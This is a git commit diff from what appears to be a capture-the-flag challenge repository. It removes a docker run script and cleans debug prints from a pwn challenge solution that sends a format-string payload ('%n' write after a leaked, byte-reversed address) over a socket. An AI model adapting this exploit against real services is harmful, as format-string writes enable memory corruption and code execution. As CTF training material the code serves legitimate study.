c1d51cecc6b31d0f2bdfc4c4c00865731c03de83
IncompetentDev <kanghweethern@gmail.com>
2018-04-13 12:04:11 -0700

    Updated build.sh in giffpassword

--- challenges/programming/giffPassword/service/run.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-
-docker run --name prog-giffpassword -d -p 18176:12345 prog-giffpassword
-
--- challenges/pwn/Magician2/solution/solution.py
+++ challenges/pwn/Magician2/solution/solution.py
@@ -9,23 +9,14 @@ def main():
         test=clientsocket.recv(4096).decode() # Read addr 
         
         addrStr = test[-9:-1:1]  # get addr
-        print(addrStr)
         
         addrStr1 = "" #stores raw string of hex form
         for i in reversed(range(0,8,2)):
-            print(i)
             addrStr1 = addrStr1 + r"\x" + str(addrStr[i:i+2]) 
-            print(addrStr1)
         payload = b""
         payload = eval("b\"" + addrStr1 + "\"") #the stupidest method to convert a hex form string into actual hex data
-        
-        print(type(payload))
-        print(payload)
-        
         payload = payload + "%016d%016d%014d%n".encode()
         
-        print(type(payload))
-        print(payload)
         
         clientsocket.sendall(payload+"\n".encode()) # send payload
         print(clientsocket.recv(4096).decode()) # Get uselesss text
